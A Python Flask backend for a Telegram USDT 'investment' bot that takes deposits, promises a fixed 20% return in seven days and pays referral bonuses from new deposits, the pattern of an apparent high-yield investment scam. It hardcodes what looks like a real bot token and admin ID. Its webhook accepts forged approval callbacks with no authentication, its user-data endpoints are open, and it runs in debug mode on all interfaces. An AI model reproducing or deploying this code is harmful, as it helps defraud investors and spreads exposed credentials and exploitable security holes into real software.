import os
import requests
import json
import secrets
import hashlib
import sqlite3
from flask import Flask, render_template, request, jsonify, session
from datetime import datetime, timedelta
from functools import wraps

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", secrets.token_hex(32))

# ============================================================
# CONFIGURATION
# ============================================================
BOT_TOKEN = os.getenv("BOT_TOKEN", "8679853739:AAEcdk9DWC51lVO1EXvmamgyWSpkp2Vfdk0")
ADMIN_ID = os.getenv("ADMIN_ID", "5738022147")
REFERRAL_BONUS = 0.05  # 5%
MIN_DEPOSIT = 10
MIN_INVESTMENT = 10
MAX_INVESTMENT = 10000
PROFIT_RATE = 20  # 20%
INVESTMENT_DAYS = 7

# ============================================================
# SQLITE DATABASE
# ============================================================
def get_db():
    db = sqlite3.connect('usdtpilot.db', timeout=10)
    db.row_factory = sqlite3.Row
    return db

def init_db():
    db = get_db()
    db.executescript('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            telegram_id TEXT UNIQUE NOT NULL,
            username TEXT,
            balance REAL DEFAULT 0,
            active_deposit REAL DEFAULT 0,
            referral_code TEXT UNIQUE,
            referred_by TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            last_login TIMESTAMP,
            is_active BOOLEAN DEFAULT 1,
            is_admin BOOLEAN DEFAULT 0
        );

        CREATE TABLE IF NOT EXISTS transactions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id TEXT,
            type TEXT,
            amount REAL,
            status TEXT DEFAULT 'PENDING',
            description TEXT,
            txid TEXT,
            network TEXT,
            date TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );

        CREATE TABLE IF NOT EXISTS investments (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id TEXT,
            amount REAL,
            expected_return REAL,
            status TEXT DEFAULT 'ACTIVE',
            start_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            maturity_date TIMESTAMP,
            profit REAL DEFAULT 0
        );

        CREATE TABLE IF NOT EXISTS referrals (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            referrer_id TEXT,
            referred_id TEXT,
            bonus REAL,
            status TEXT DEFAULT 'PENDING',
            date TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );

        CREATE TABLE IF NOT EXISTS support_tickets (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id TEXT,
            subject TEXT,
            message TEXT,
            status TEXT DEFAULT 'OPEN',
            admin_response TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );

        CREATE TABLE IF NOT EXISTS withdrawal_whitelist (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id TEXT,
            address TEXT,
            network TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );

        CREATE TABLE IF NOT EXISTS notifications (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id TEXT,
            title TEXT,
            message TEXT,
            is_read BOOLEAN DEFAULT 0,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
    ''')
    db.commit()
    db.close()

# Initialize database
init_db()

# ============================================================
# HELPER FUNCTIONS
# ============================================================
def send_telegram(chat_id, text, keyboard=None, parse_mode='HTML'):
    """Send Telegram Message"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": parse_mode
    }
    if keyboard:
        payload["reply_markup"] = keyboard
    try:
        return requests.post(url, json=payload, timeout=10).json()
    except Exception as e:
        print(f"Error: {e}")
        return None

def get_user(user_id):
    """Get or create user"""
    db = get_db()
    user = db.execute('SELECT * FROM users WHERE telegram_id = ?', (str(user_id),)).fetchone()
    db.close()
    
    if not user:
        # Create new user
        ref_code = secrets.token_hex(4).upper()
        db = get_db()
        db.execute('''
            INSERT INTO users (telegram_id, username, referral_code, created_at, last_login)
            VALUES (?, ?, ?, ?, ?)
        ''', (str(user_id), 'User', ref_code, datetime.now(), datetime.now()))
        db.commit()
        db.close()
        user = get_user(user_id)
    
    return dict(user) if user else None

def create_referral_link(user_id):
    """Create referral link"""
    return f"https://t.me/USDTPilotBot?start=ref_{user_id}"

def create_notification(user_id, title, message):
    """Create new notification"""
    db = get_db()
    db.execute('''
        INSERT INTO notifications (user_id, title, message)
        VALUES (?, ?, ?)
    ''', (str(user_id), title, message))
    db.commit()
    db.close()

# ============================================================
# ROUTES - USER DATA
# ============================================================
@app.route('/')
def home():
    """Render frontend"""
    return render_template('index.html')

@app.route('/api/auth/verify', methods=['POST'])
def verify_user():
    """Verify user upon launch"""
    data = request.json
    user_id = data.get('user_id')
    username = data.get('username', 'User')
    
    if not user_id:
        return jsonify({"status": "error", "message": "User ID missing"})
    
    # Get or create user
    user = get_user(user_id)
    
    # Update profile info
    db = get_db()
    db.execute('''
        UPDATE users 
        SET username = ?, last_login = ?
        WHERE telegram_id = ?
    ''', (username, datetime.now(), str(user_id)))
    db.commit()
    db.close()
    
    return jsonify({
        "status": "success",
        "user": user,
        "referral_link": create_referral_link(user_id),
        "message": f"Welcome {username}!"
    })

@app.route('/api/user/<user_id>', methods=['GET'])
def get_user_data(user_id):
    """Return complete user data"""
    user = get_user(user_id)
    if not user:
        return jsonify({"error": "User not found"}), 404
    
    db = get_db()
    
    # Transactions
    transactions = db.execute('''
        SELECT * FROM transactions 
        WHERE user_id = ? 
        ORDER BY date DESC LIMIT 50
    ''', (str(user_id),)).fetchall()
    
    # Active investments
    investments = db.execute('''
        SELECT * FROM investments 
        WHERE user_id = ? AND status = 'ACTIVE'
    ''', (str(user_id),)).fetchall()
    
    # Notifications
    notifications = db.execute('''
        SELECT * FROM notifications 
        WHERE user_id = ? AND is_read = 0
        ORDER BY created_at DESC
    ''', (str(user_id),)).fetchall()
    
    # Referrals
    referrals = db.execute('''
        SELECT COUNT(*) as total, SUM(bonus) as earnings
        FROM referrals 
        WHERE referrer_id = ? AND status = 'COMPLETED'
    ''', (str(user_id),)).fetchone()
    
    db.close()
    
    return jsonify({
        "user": user,
        "macaamilo": [dict(t) for t in transactions],
        "maalgashi": [dict(i) for i in investments],
        "ogeysiis": [dict(n) for n in notifications],
        "taf": {
            "wadarta": referrals['total'] if referrals else 0,
            "dakhli": referrals['earnings'] if referrals and referrals['earnings'] else 0
        }
    })

# ============================================================
# ROUTES - DEPOSIT
# ============================================================
@app.route('/api/deposit/request', methods=['POST'])
def request_deposit():
    """User requests deposit"""
    data = request.json
    user_id = str(data.get('user_id'))
    username = data.get('username', 'User')
    network = data.get('network', 'TRC20')
    txid = data.get('txid')
    amount = float(data.get('amount', 0))
    
    if amount < MIN_DEPOSIT:
        return jsonify({"status": "error", "message": f"Minimum deposit is ${MIN_DEPOSIT} USDT"})
    
    if not txid:
        return jsonify({"status": "error", "message": "TXID is required"})
    
    # Save transaction
    db = get_db()
    db.execute('''
        INSERT INTO transactions (user_id, type, amount, status, txid, network, description)
        VALUES (?, ?, ?, ?, ?, ?, ?)
    ''', (user_id, 'DEPOSIT', amount, 'PENDING', txid, network, f'Deposit via {network}'))
    db.commit()
    db.close()
    
    # Notify Admin
    keyboard = {
        "inline_keyboard": [
            [
                {"text": "✅ Approve", "callback_data": f"approve_deposit_{user_id}_{amount}"},
                {"text": "❌ Reject", "callback_data": f"reject_deposit_{user_id}"}
            ]
        ]
    }
    
    admin_msg = f"""
📥 <b>NEW DEPOSIT REQUEST</b>

👤 <b>User:</b> {username}
🆔 <b>ID:</b> <code>{user_id}</code>
💰 <b>Amount:</b> ${amount:,.2f} USDT
🌐 <b>Network:</b> {network}
🔗 <b>TXID:</b> <code>{txid}</code>
🕐 <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
    """
    
    send_telegram(ADMIN_ID, admin_msg, keyboard)
    
    # Notify User
    create_notification(
        user_id,
        "📥 Deposit Submitted",
        f"Your deposit of ${amount:,.2f} USDT was submitted. Admin will verify shortly."
    )
    
    return jsonify({
        "status": "success",
        "message": "Deposit request sent to admin!"
    })

# ============================================================
# ROUTES - INVESTMENT
# ============================================================
@app.route('/api/invest', methods=['POST'])
def invest():
    """User places investment"""
    data = request.json
    user_id = str(data.get('user_id'))
    amount = float(data.get('amount', 0))
    
    if amount < MIN_INVESTMENT:
        return jsonify({"status": "error", "message": f"Minimum investment is ${MIN_INVESTMENT}"})
    
    if amount > MAX_INVESTMENT:
        return jsonify({"status": "error", "message": f"Maximum investment is ${MAX_INVESTMENT}"})
    
    user = get_user(user_id)
    if not user or user['balance'] < amount:
        return jsonify({"status": "error", "message": "Insufficient balance! Please deposit first."})
    
    # Start investment
    db = get_db()
    expected_return = amount * (1 + PROFIT_RATE / 100)
    maturity_date = datetime.now() + timedelta(days=INVESTMENT_DAYS)
    
    db.execute('''
        INSERT INTO investments (user_id, amount, expected_return, maturity_date)
        VALUES (?, ?, ?, ?)
    ''', (user_id, amount, expected_return, maturity_date))
    
    # Update balance
    db.execute('''
        UPDATE users 
        SET balance = balance - ?, active_deposit = active_deposit + ?
        WHERE telegram_id = ?
    ''', (amount, amount, user_id))
    
    # Record transaction
    db.execute('''
        INSERT INTO transactions (user_id, type, amount, status, description)
        VALUES (?, ?, ?, ?, ?)
    ''', (user_id, 'INVESTMENT', -amount, 'COMPLETED', f'Investment ${amount} USDT'))
    
    db.commit()
    db.close()
    
    # Notify User
    create_notification(
        user_id,
        "💰 Investment Started",
        f"Your investment of ${amount:,.2f} USDT has started. Expected return: ${expected_return:,.2f} USDT"
    )
    
    return jsonify({
        "status": "success",
        "message": f"Investment of ${amount:,.2f} USDT started successfully!",
        "soo_celin": expected_return,
        "taariikh_dhamaad": maturity_date.strftime('%Y-%m-%d')
    })

# ============================================================
# ROUTES - WITHDRAWAL
# ============================================================
@app.route('/api/withdraw/request', methods=['POST'])
def request_withdrawal():
    """User requests withdrawal"""
    data = request.json
    user_id = str(data.get('user_id'))
    address = data.get('address')
    amount = float(data.get('amount', 0))
    network = data.get('network', 'TRC20')
    
    if amount < 10:
        return jsonify({"status": "error", "message": "Minimum withdrawal is $10 USDT"})
    
    user = get_user(user_id)
    if not user or user['balance'] < amount:
        return jsonify({"status": "error", "message": "Insufficient balance!"})
    
    # Record transaction
    db = get_db()
    db.execute('''
        INSERT INTO transactions (user_id, type, amount, status, description, network)
        VALUES (?, ?, ?, ?, ?, ?)
    ''', (user_id, 'WITHDRAWAL', -amount, 'PENDING', f'Withdrawal to {network}', network))
    
    # Whitelist address
    db.execute('''
        INSERT OR IGNORE INTO withdrawal_whitelist (user_id, address, network)
        VALUES (?, ?, ?)
    ''', (user_id, address, network))
    
    db.commit()
    db.close()
    
    # Notify Admin
    keyboard = {
        "inline_keyboard": [
            [
                {"text": "✅ Approve", "callback_data": f"approve_withdraw_{user_id}_{amount}"},
                {"text": "❌ Reject", "callback_data": f"reject_withdraw_{user_id}"}
            ]
        ]
    }
    
    admin_msg = f"""
📤 <b>NEW WITHDRAWAL REQUEST</b>

👤 <b>User:</b> {user['username']}
🆔 <b>ID:</b> <code>{user_id}</code>
💰 <b>Amount:</b> ${amount:,.2f} USDT
🌐 <b>Network:</b> {network}
🏦 <b>Address:</b> <code>{address}</code>
💳 <b>Balance:</b> ${user['balance']:,.2f} USDT
    """
    
    send_telegram(ADMIN_ID, admin_msg, keyboard)
    
    create_notification(
        user_id,
        "📤 Withdrawal Requested",
        f"Your withdrawal request of ${amount:,.2f} USDT was submitted. Pending approval."
    )
    
    return jsonify({
        "status": "success",
        "message": "Withdrawal request sent to admin!"
    })

# ============================================================
# ROUTES - REFERRALS
# ============================================================
@app.route('/api/referral/stats', methods=['GET'])
def referral_stats():
    """Get referral statistics"""
    user_id = request.args.get('user_id')
    
    db = get_db()
    
    referrals_list = db.execute('''
        SELECT r.*, u.username as magaca_taf 
        FROM referrals r
        JOIN users u ON r.referred_id = u.telegram_id
        WHERE r.referrer_id = ?
        ORDER BY r.date DESC
    ''', (str(user_id),)).fetchall()
    
    stats = db.execute('''
        SELECT 
            COUNT(*) as wadarta,
            SUM(CASE WHEN status = 'COMPLETED' THEN 1 ELSE 0 END) as dhammaystiray,
            SUM(CASE WHEN status = 'PENDING' THEN 1 ELSE 0 END) as sugaya,
            SUM(bonus) as wadarta_guno
        FROM referrals
        WHERE referrer_id = ?
    ''', (str(user_id),)).fetchone()
    
    db.close()
    
    return jsonify({
        "taf": [dict(r) for r in referrals_list],
        "tirakoob": dict(stats) if stats else {
            "wadarta": 0,
            "dhammaystiray": 0,
            "sugaya": 0,
            "wadarta_guno": 0
        }
    })

# ============================================================
# ROUTES - SUPPORT
# ============================================================
@app.route('/api/support/create', methods=['POST'])
def create_ticket():
    """User creates support ticket"""
    data = request.json
    user_id = str(data.get('user_id'))
    subject = data.get('subject')
    message = data.get('message')
    
    if not subject or not message:
        return jsonify({"status": "error", "message": "Subject and message are required"})
    
    db = get_db()
    db.execute('''
        INSERT INTO support_tickets (user_id, subject, message, status)
        VALUES (?, ?, ?, ?)
    ''', (user_id, subject, message, 'OPEN'))
    db.commit()
    db.close()
    
    admin_msg = f"""
🎫 <b>NEW SUPPORT TICKET</b>

👤 <b>User ID:</b> <code>{user_id}</code>
📋 <b>Subject:</b> {subject}
📝 <b>Message:</b> {message}
    """
    
    send_telegram(ADMIN_ID, admin_msg)
    
    return jsonify({
        "status": "success",
        "message": "Support ticket created successfully!"
    })

@app.route('/api/support/tickets', methods=['GET'])
def get_tickets():
    """Get user support tickets"""
    user_id = request.args.get('user_id')
    
    db = get_db()
    tickets = db.execute('''
        SELECT * FROM support_tickets 
        WHERE user_id = ?
        ORDER BY created_at DESC
    ''', (str(user_id),)).fetchall()
    db.close()
    
    return jsonify({
        "tikidhyo": [dict(t) for t in tickets]
    })

# ============================================================
# ROUTES - NOTIFICATIONS
# ============================================================
@app.route('/api/notifications/mark-read', methods=['POST'])
def mark_read():
    """Mark notifications as read"""
    data = request.json
    user_id = str(data.get('user_id'))
    
    db = get_db()
    db.execute('''
        UPDATE notifications 
        SET is_read = 1 
        WHERE user_id = ?
    ''', (user_id,))
    db.commit()
    db.close()
    
    return jsonify({"status": "success"})

# ============================================================
# ROUTES - CALCULATOR
# ============================================================
@app.route('/api/calculator', methods=['POST'])
def calculate_return():
    """Calculate ROI"""
    data = request.json
    amount = float(data.get('amount', 0))
    days = int(data.get('days', INVESTMENT_DAYS))
    
    daily_rate = PROFIT_RATE / days
    total_return = amount * (1 + daily_rate / 100 * days)
    
    return jsonify({
        "qadar": amount,
        "maalmood": days,
        "wadarta_soo_celin": round(total_return, 2),
        "faaiido": round(total_return - amount, 2)
    })

# ============================================================
# TELEGRAM WEBHOOK
# ============================================================
@app.route('/webhook', methods=['POST'])
def webhook():
    """Telegram Bot Webhook - Admin Actions"""
    update = request.json
    
    if "callback_query" in update:
        query = update["callback_query"]
        data = query["data"]
        chat_id = query["message"]["chat"]["id"]
        message_id = query["message"]["message_id"]
        
        # APPROVE DEPOSIT
        if data.startswith("approve_deposit_"):
            parts = data.split("_")
            user_id = parts[2]
            amount = float(parts[3])
            
            db = get_db()
            db.execute('''
                UPDATE transactions 
                SET status = 'COMPLETED' 
                WHERE user_id = ? AND type = 'DEPOSIT' AND status = 'PENDING'
                ORDER BY date DESC LIMIT 1
            ''', (user_id,))
            
            db.execute('''
                UPDATE users 
                SET balance = balance + ? 
                WHERE telegram_id = ?
            ''', (amount, user_id))
            
            db.commit()
            db.close()
            
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText", json={
                "chat_id": chat_id,
                "message_id": message_id,
                "text": f"✅ <b>DEPOSIT APPROVED</b>\n\nUser: <code>{user_id}</code>\nAmount: +${amount:,.2f} USDT",
                "parse_mode": "HTML"
            })
            
            user = get_user(user_id)
            user_msg = f"""
🎉 <b>Deposit Approved!</b>

Your deposit of <b>${amount:,.2f} USDT</b> was confirmed.

💰 <b>New Balance:</b> ${user['balance']:,.2f} USDT

You can now start investing!
            """
            send_telegram(user_id, user_msg)
            
            create_notification(
                user_id,
                "✅ Deposit Approved",
                f"Your deposit of ${amount:,.2f} USDT has been approved!"
            )
            
            # Referral Bonus check
            if user and user.get('referred_by'):
                referrer = get_user(user['referred_by'])
                if referrer:
                    bonus = amount * REFERRAL_BONUS
                    db = get_db()
                    db.execute('''
                        UPDATE users 
                        SET balance = balance + ? 
                        WHERE telegram_id = ?
                    ''', (bonus, referrer['telegram_id']))
                    
                    db.execute('''
                        INSERT INTO referrals (referrer_id, referred_id, bonus, status)
                        VALUES (?, ?, ?, ?)
                    ''', (referrer['telegram_id'], user_id, bonus, 'COMPLETED'))
                    db.commit()
                    db.close()
                    
                    send_telegram(
                        referrer['telegram_id'],
                        f"🎁 <b>Referral Bonus!</b>\n\nYou earned <b>${bonus:,.2f} USDT</b> from {user['username']}'s deposit!"
                    )
        
        # REJECT DEPOSIT
        elif data.startswith("reject_deposit_"):
            user_id = data.split("_")[2]
            
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText", json={
                "chat_id": chat_id,
                "message_id": message_id,
                "text": f"❌ <b>DEPOSIT REJECTED</b>\n\nUser: <code>{user_id}</code>",
                "parse_mode": "HTML"
            })
            
            user_msg = """
❌ <b>Deposit Rejected</b>

Your deposit request was declined.

📌 Possible reasons:
• Invalid TXID
• Incorrect amount
• Unmatched network

Please submit a new request.
            """
            send_telegram(user_id, user_msg)
        
        # APPROVE WITHDRAWAL
        elif data.startswith("approve_withdraw_"):
            parts = data.split("_")
            user_id = parts[2]
            amount = float(parts[3])
            
            db = get_db()
            db.execute('''
                UPDATE transactions 
                SET status = 'COMPLETED' 
                WHERE user_id = ? AND type = 'WITHDRAWAL' AND status = 'PENDING'
                ORDER BY date DESC LIMIT 1
            ''', (user_id,))
            
            db.execute('''
                UPDATE users 
                SET balance = balance - ? 
                WHERE telegram_id = ?
            ''', (amount, user_id))
            
            db.commit()
            db.close()
            
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText", json={
                "chat_id": chat_id,
                "message_id": message_id,
                "text": f"✅ <b>WITHDRAWAL APPROVED</b>\n\nUser: <code>{user_id}</code>\nAmount: -${amount:,.2f} USDT",
                "parse_mode": "HTML"
            })
            
            user = get_user(user_id)
            user_msg = f"""
✅ <b>Withdrawal Approved!</b>

Your withdrawal of <b>${amount:,.2f} USDT</b> has been processed.

💰 <b>New Balance:</b> ${user['balance']:,.2f} USDT
            """
            send_telegram(user_id, user_msg)
            
            create_notification(
                user_id,
                "✅ Withdrawal Approved",
                f"Your withdrawal of ${amount:,.2f} USDT was approved!"
            )
        
        # REJECT WITHDRAWAL
        elif data.startswith("reject_withdraw_"):
            user_id = data.split("_")[2]
            
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText", json={
                "chat_id": chat_id,
                "message_id": message_id,
                "text": f"❌ <b>WITHDRAWAL REJECTED</b>\n\nUser: <code>{user_id}</code>",
                "parse_mode": "HTML"
            })
            
            user_msg = """
❌ <b>Withdrawal Rejected</b>

Your withdrawal request was declined.

📌 Possible reasons:
• Invalid wallet address
• Insufficient balance
            """
            send_telegram(user_id, user_msg)
    
    return jsonify({"status": "ok"})

# ============================================================
# START SERVER
# ============================================================
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
